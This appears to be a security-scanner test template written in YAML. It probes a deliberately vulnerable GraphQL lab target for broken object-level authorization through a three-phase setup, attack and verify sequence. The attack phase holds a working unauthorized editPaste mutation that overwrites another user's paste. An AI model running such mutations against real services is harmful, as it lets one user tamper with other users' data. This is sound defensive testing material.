# API1:2023 Broken Object Level Authorization - vulnerable-graphql editPaste Mutation (Verified)
#
# This template tests for BOLA vulnerabilities in the in-house GraphQL target's editPaste
# mutation using a three-phase approach that verifies mutation persistence:
#
# Phase 1 (setup): Read paste ID 3 as victim (user1) to capture original state
# Phase 2 (attack): Attacker (user2) attempts unauthorized editPaste mutation on victim's paste
# Phase 3 (verify): Re-read paste ID 3 to confirm mutation persisted
#
# Paste 3 is owned by user1 (victim); user2 (attacker) editing it proves cross-user BOLA.
# Uses paste 3 (edit) — distinct from template 01 which deletes paste 1, avoiding runtime collision.
#
# Success criteria: All three phases return 200 AND verify phase shows attacker's modified title

id: api1-bola-edit-paste-mutation
info:
  name: "vulnerable-graphql - BOLA via editPaste Mutation (Verified)"
  category: "API1:2023 Broken Object Level Authorization"
  severity: "CRITICAL"
  author: "hadrian"
  description: |
    Tests for Broken Object Level Authorization (BOLA) in the in-house GraphQL target's
    editPaste mutation with verification. The editPaste mutation does not properly check if
    the authenticated user is the owner of the paste, allowing attackers to modify pastes
    owned by other users. This template uses a three-phase approach to verify the mutation
    actually persisted: setup reads original state, attack performs unauthorized modification,
    and verify confirms the change persisted.
  tags: ["graphql", "owasp", "owasp-api-top10", "vulnerable-graphql", "bola", "authorization", "idor", "mutation"]
  requires_llm_triage: false
  test_pattern: "mutation"

endpoint_selector:
  requires_auth: true

role_selector:
  attacker_permission_level: "lower"
  victim_permission_level: "higher"

graphql:
  # Phase 1: Setup - victim (user1) reads their own paste to capture original state
  - query: |
      query GetPaste {
        paste(id: 3) {
          id
          title
          content
          ownerId
        }
      }
    auth: "victim"
    store_response_fields:
      original_title: "data.paste.title"
    matchers:
      - type: status
        status: [200]

  # Phase 2: Attack - attacker (user2) modifies victim's paste without authorization
  - query: |
      mutation EditPaste {
        editPaste(id: 3, title: "ATTACKER_MODIFIED", content: "Unauthorized modification by attacker") {
          paste {
            id
            title
            content
            ownerId
          }
        }
      }
    auth: "attacker"
    matchers:
      - type: status
        status: [200]
      - type: word
        words: ["ATTACKER_MODIFIED"]
        part: body

  # Phase 3: Verify - victim re-reads to confirm change persisted; proves cross-user BOLA
  - query: |
      query VerifyPaste {
        paste(id: 3) {
          id
          title
          content
          ownerId
        }
      }
    auth: "victim"
    matchers:
      - type: status
        status: [200]
      - type: word
        words: ["ATTACKER_MODIFIED"]
        part: body

detection:
  success_indicators:
    - type: status_code
      status_code: 200
    - type: body_field
      body_field: "data.paste.title"
      value: "ATTACKER_MODIFIED"
  vulnerability_pattern: "vulnerable_graphql_bola_paste_mutation_verified"
  # Cross-user BOLA: attacker (user2, ownerId=3) modified paste owned by victim (user1, ownerId=2)
  conditions:
    - attack_phase_status: [200]
      verify_phase_status: [200]
      verify_field_changed: true
